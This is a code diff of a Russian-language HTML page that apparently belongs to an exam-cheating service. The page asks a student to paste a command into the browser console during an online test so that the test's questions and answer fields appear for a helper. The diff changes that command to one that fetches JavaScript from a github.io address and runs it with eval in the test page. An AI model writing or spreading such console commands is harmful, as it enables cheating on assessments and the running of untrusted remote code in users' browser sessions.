@@ -298,9 +298,9 @@
         </div>
         <h3>Ожидание запуска F12-скрипта у ученика...</h3>
         <p>Как только ученик выполнит команду в консоли браузера на тесте, здесь появятся вопросы, варианты ответов, картинки и поля для ввода.</p>
-        <div class="f12-copy-box" onclick="navigator.clipboard.writeText('import(\\'https://grzlly.github.io/sibs/1.js\\')'); alert('Команда скопирована в буфер обмена!');" title="Нажмите для копирования">
-          <code>import('https://grzlly.github.io/sibs/1.js')</code>
-          <span class="copy-badge">Копировать</span>
+        <div class="f12-copy-box" onclick="navigator.clipboard.writeText('eval(await (await fetch(\'https://grzlly.github.io/sibs/1.js?t=\' + Date.now())).text())'); alert('Команда скопирована!');" title="Прямой надёжный канал (GitHub Pages)">
+          <code>eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now())).text())</code>
+          <span class="copy-badge">GitHub</span>
         </div>
       </div>
     `;
